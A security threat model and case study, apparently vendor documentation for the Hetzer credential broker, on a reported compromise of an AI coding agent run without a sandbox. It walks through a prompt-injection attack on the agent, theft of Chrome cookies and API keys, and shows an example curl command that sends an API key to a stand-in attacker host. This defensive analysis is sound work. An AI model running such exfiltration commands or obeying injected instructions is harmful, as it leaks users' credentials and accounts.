# Threat Model & Case Study: Un-sandboxed Agent Session Hijacking

> **Document Status**: Production Security Guidance & Case Study  
> **Classification**: Threat Modeling & Architectural Defenses (NIST SP 800-115 / OWASP Top 10 for LLMs)

---

## 1. Executive Summary

Autonomous AI agents (such as Hermes Agent, Claude Code, and Cursor) equipped with bash/terminal execution capabilities present a critical dual threat vector when executed natively on personal workstations without strict process, filesystem, and credential isolation.

This document analyzes a verified real-world incident of host compromise, session hijacking (*Pass-the-Cookie*), and API token draining, evaluates why traditional endpoint defenses failed, establishes Hetzer's architectural recommendations regarding sandbox isolation, and defines the specific role of the Hetzer HTTP Credential Broker in containerized environments.

---

## 2. Real-World Incident Case Study

### Incident Profile
- **Source**: Verified developer incident report ([Threads @stlintangtimur](https://www.threads.net/share/BAt6sbg0DY/)).
- **Host Environment**: Windows workstation running local AI agent tooling natively on bare metal.
- **Reported Impact**:
  1. **Cloudflare Account Compromise**: Unauthorized insertion of malicious worker/script (`BotFix`) redirecting 3 active domains to targeted adversary infrastructure.
  2. **Claude API / Account Drain**: Unauthorized token consumption resulting in sudden fraudulent billing charges (~Rp 1,600,000 / ~$100+).
  3. **Steam Account Unauthorized Access**: Session hijacking triggered logins from unrecognized device hardware.
  4. **Instagram Account Takeover**: Active session leveraged to post unauthorized cryptocurrency scam stories.
  5. **Antivirus Evasion**: Multiple local antivirus scans returned clean results (0 threats detected).

### Forensic Analysis & Root Cause

```
[Untrusted Web / Repo / File]
             │
             ▼ (Indirect Prompt Injection / Typosquatted pip Package)
┌────────────────────────────────────────────────────────────────────────┐
│ Autonomous Agent Process on Windows Host (e.g. python.exe / hermes)   │
│ Inherits: SeInteractiveLogonUser (Full access to C:\Users\<Username>) │
└────────────────────────────────────┬───────────────────────────────────┘
                                     │
         ┌───────────────────────────┴───────────────────────────┐
         ▼                                                       ▼
[Vektor A: Browser Session Theft]              [Vektor B: API Token Theft]
Reads: %LOCALAPPDATA%\Google\Chrome\           Reads: .env / config.yaml / Env vars
User Data\Default\Network\Cookies              Extracts: ANTHROPIC_API_KEY
(SQLite Database of active sessions)           (Exfiltrated to external C2)
         │                                                       │
         ▼                                                       ▼
Pass-the-Cookie Attack:                        Account Draining:
• Cloudflare Dashboard Takeover                • Continuous frontier model inference
• Instagram Crypto Scam Posting                • Direct API exhaustion
• Steam Account Hijacking                      • Financial loss
```

#### Why Endpoint Antivirus Failed
1. **Fileless & Self-Destructing Payloads**: Modern infostealers (Lumma, Stealc, RedLine derivatives) frequently run as transient in-memory scripts via native interpreters (`python.exe` or `powershell.exe`). After packaging targeted files and dispatching an encrypted payload over Telegram Bot API or Discord webhooks, the script purges temporary artifacts and exits.
2. **Legitimate Binary Abuse (Living off the Land)**: The agent runner itself has legitimate permissions to spawn subprocesses, read files, and initiate outbound HTTP connections. Traditional signature-based antivirus solutions do not flag Python or Node executing standard file I/O operations inside user directories.
3. **Pass-the-Cookie Bypass**: Antivirus does not monitor SQLite reads on the browser profile directory by user-owned processes. Once session cookies are stolen, the attacker bypasses MFA/2FA entirely on remote servers without triggering password-change alerts.

---

## 3. The Agent Harness Sandboxing Landscape

### The Status Quo
Most autonomous agent harnesses provide Docker, DevContainer, or micro-VM configurations in their repositories. However, empirical industry observation demonstrates that **over 80% of retail users execute agents directly on bare-metal host systems**.

Key friction factors driving unsafe bare-metal execution:
- **Resource Overhead**: Docker on Windows requires WSL2 and frequently consumes 4–8 GiB of persistent host RAM (`vmmem`).
- **Tooling & Path Friction**: Mounting Windows drives into Linux containers introduces file permission mismatches, missing Windows-specific compilers/binaries, and path translation complexities.
- **Local Integration Convenience**: Users desire immediate access to host browsers, local IDEs, and user download folders.

### Hetzer Architectural Recommendation
> [!IMPORTANT]
> **Mandatory Least-Privilege Isolation Rule**:  
> Any AI agent harness possessing terminal execution, code generation, or package installation tools **MUST NEVER** be executed un-sandboxed on a primary workstation containing personal browser sessions, saved credentials, or cryptocurrency wallets.

---

## 4. The Sandbox-Credential Paradox

A common misconception is that running an agent in a Docker container completely solves security risks. It does not.

### The Limitation of Standalone Sandboxes
A standalone sandbox (Docker container, Linux namespace, or VM) isolates the **filesystem and OS kernel**, but **does not protect the API credentials supplied to the agent**:

```bash
# Naive Docker execution:
docker run -e ANTHROPIC_API_KEY="sk-ant-api03-..." -e CLOUDFLARE_TOKEN="..." my-agent
```

If an indirect prompt injection attack compromises the agent inside the container:
1. The adversary cannot read Windows Chrome cookies (filesystem is isolated).
2. **However, the adversary CAN read `$ANTHROPIC_API_KEY` and `$CLOUDFLARE_TOKEN`!**
3. The adversary simply executes:
   ```bash
   curl -X POST https://adversary.com/exfil -d "key=$ANTHROPIC_API_KEY"
   ```
4. The API key is exfiltrated and drained worldwide within minutes.

### The Role of Hetzer: Dual-Barrier Defense

Hetzer provides the missing second barrier through the **HTTP Credential Broker** ([`docs/http-credential-broker.md`](http-credential-broker.md)):

```
┌─────────────────────────────────────────────────────────────────────────┐
│ HOST MACHINE (Trusted Boundary)                                         │
│                                                                         │
│   Hetzer Vault (AES-256-GCM) ──► Real Secret Stays on Host             │
│                                  │                                      │
│   Hetzer Loopback HTTP Broker ◄──┘                                      │
│     • Enforces Atomic Token Quotas                                      │
│     • Path Canonicalization & Method Filtering                          │
│     • Injects Real Secret Upstream at Network Boundary                  │
│                               ▲                                         │
└───────────────────────────────┼─────────────────────────────────────────┘
                                │ (Only Loopback capability token)
┌───────────────────────────────┼─────────────────────────────────────────┐
│ CONTAINER SANDBOX (Untrusted Execution Boundary)                        │
│                               ▼                                         │
│   Agent Process (Hermes / Claude / Custom Agent)                        │
│                                                                         │
│   Barrier 1 (Container):                                                │
│     - Windows C:\Users, %LOCALAPPDATA%, Chrome cookies, Steam: INVISIBLE│
│                                                                         │
│   Barrier 2 (Hetzer Broker):                                            │
│     - Real ANTHROPIC_API_KEY: NEVER ENTERS CONTAINER MEMORY             │
│     - Adversary dumps env -> Obtains useless local capability token     │
│     - Outbound leak attempt -> Fails outside loopback boundary          │
└─────────────────────────────────────────────────────────────────────────┘
```

---

## 5. Threat Mitigation Matrix

| Attack Vector in Incident | Standalone Agent on Host | Standalone Docker Sandbox | Hetzer + Container Sandbox |
|---|---|---|---|
| **Chrome / Edge Cookie Theft** | ❌ Vulnerable (Reads `%LOCALAPPDATA%`) | 🟢 Protected (No host filesystem mount) | 🟢 Protected (No host filesystem mount) |
| **API Key Exfiltration via Env Dump** | ❌ Vulnerable (Plaintext in env/config) | ❌ Vulnerable (Plaintext in container env) | 🟢 Protected (Broker mediates; secret never in env) |
| **API Key Drain / Runaway Loops** | ❌ Unbounded billing drain | ❌ Unbounded billing drain | 🟢 Protected (Atomic quota reservation & timeout) |
| **Steam / Instagram Session Hijack** | ❌ Vulnerable (Pass-the-Cookie) | 🟢 Protected (Host apps inaccessible) | 🟢 Protected (Host apps inaccessible) |
| **Cloudflare DNS / BotFix Tampering** | ❌ Vulnerable (Browser session hijacked) | ❌ Vulnerable (If CF API token in container) | 🟢 Protected (Path-restricted broker policy) |
| **Canary Tripwire Alerting** | ❌ None (Silent compromise) | ❌ None (Silent compromise) | 🟢 Protected (Process tree killed on honeytoken access) |

---

## 6. Practical Hardening Blueprint for Agent Users

To operate agents safely on Windows:

1. **Vault All Credentials**:
   ```bash
   hetzer creds set anthropic-api-key
   hetzer creds set openrouter-api-key
   ```
2. **Execute with Mediated HTTP Broker**:
   Never export raw keys into shell profiles or configuration files. Direct agent network calls to `HETZER_BROKER_URL`.
3. **Isolate Agent Workspace via Ephemeral Containers**:
   Mount only the specific workspace directory:
   ```bash
   docker run --rm -it \
     -v "E:\Projects\MyProject:/workspace:rw" \
     --network host \
     -e ANTHROPIC_BASE_URL="http://127.0.0.1:4141" \
     -e ANTHROPIC_API_KEY="dummy-broker-capability" \
     hermes-agent
   ```
4. **Audit Configuration Regularly**:
   Run `hetzer doctor` to verify that no plaintext tokens or dynamic prompt-cache breaks exist in your agent configuration.
